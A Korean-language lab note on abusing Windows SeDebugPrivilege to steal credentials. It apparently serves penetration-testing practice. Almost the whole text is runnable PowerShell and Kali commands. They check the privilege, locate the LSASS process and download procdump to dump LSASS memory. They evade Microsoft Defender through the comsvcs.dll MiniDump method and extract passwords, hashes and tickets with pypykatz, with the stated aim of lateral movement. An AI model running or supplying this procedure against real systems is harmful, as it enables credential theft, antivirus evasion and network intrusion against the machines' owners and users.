# SeDebugPrivilege — 실습

- 뜻: 디버그. 다른 프로세스 메모리를 읽고 쓸 수 있다. SYSTEM 프로세스에도 접근 가능
- 핵심: SeDebug = LSASS 덤프 = 자격 증명 탈취 = 측면 이동의 시작점

## 1. 특권 상태 확인

```powershell
whoami /priv | findstr /i "SeDebug"
```

## 2. SYSTEM 프로세스 확인 (PID 확보)

```powershell
Get-Process -Name lsass
```

### 보조 확인

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
```

- PID가 숫자로 찍히면 SeDebug로 lsass에 접근 가능한 상태다

## 3. LSASS 메모리 덤프 (procdump)

Local Security Authority Subsystem Service

### 작업 폴더 준비

```powershell
New-Item -Path C:\temp -ItemType Directory -Force
```

### Sysinternals procdump 다운로드

```powershell
Invoke-WebRequest -UseBasicParsing -TimeoutSec 20 https://live.sysinternals.com/procdump.exe -OutFile C:\temp\procdump.exe
```

### 다운로드 검증

```powershell
Get-Item C:\temp\procdump.exe
```

- 출력이 없거나 `Cannot find path`면 외부망 차단 → 04 문서의 Kali 경유(`certutil`) 방식으로 전환

### 덤프 실행 (SeDebug가 있어야 SYSTEM 프로세스에 접근 가능)

```powershell
C:\temp\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

### Defender 우회 (내장 방식, 파일 전송 불필요)

Defender가 procdump를 삭제하면 사용

```powershell
$p = (Get-Process -Name lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\temp\lsass.dmp full
```

### 덤프 파일 확인

```powershell
Get-Item C:\temp\lsass.dmp
```

## 4. 덤프에서 자격 증명 추출 (Kali)

dmp를 Kali로 가져온 뒤 실행. 타겟에서 mimikatz를 직접 돌리지 않는다 (Defender 탐지)

```bash
pypykatz lsa minidump /tmp/lsass.dmp
```

## 5. 이해 포인트

- SeDebug가 있으면 SYSTEM 프로세스 메모리를 읽을 수 있다
- LSASS에는 로그인한 사용자의 패스워드/해시/티켓이 복호화 가능한 형태로 있다
